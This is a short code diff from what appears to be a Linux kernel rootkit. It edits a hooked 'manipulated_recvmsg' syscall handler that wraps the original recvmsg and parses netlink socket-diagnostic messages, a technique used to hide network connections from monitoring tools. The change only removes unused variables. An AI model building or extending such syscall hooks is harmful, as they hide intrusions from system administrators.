@@ -135,8 +135,6 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
 	long ret;
     	long count; 
     	struct nlmsghdr* h;
-    	__kernel_size_t numblocks;
-    	struct inet_diag_msg *r;
     	char* currhdr;
     	int i;
     	int found=0;
@@ -144,9 +142,7 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
 
 		
         h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
-        numblocks = msg->msg_iovlen;
-        r = NLMSG_DATA(h);
-       
+	
 	// compute the length of original call 
         ret = original_recvmsg(sockfd,msg,flags);
         
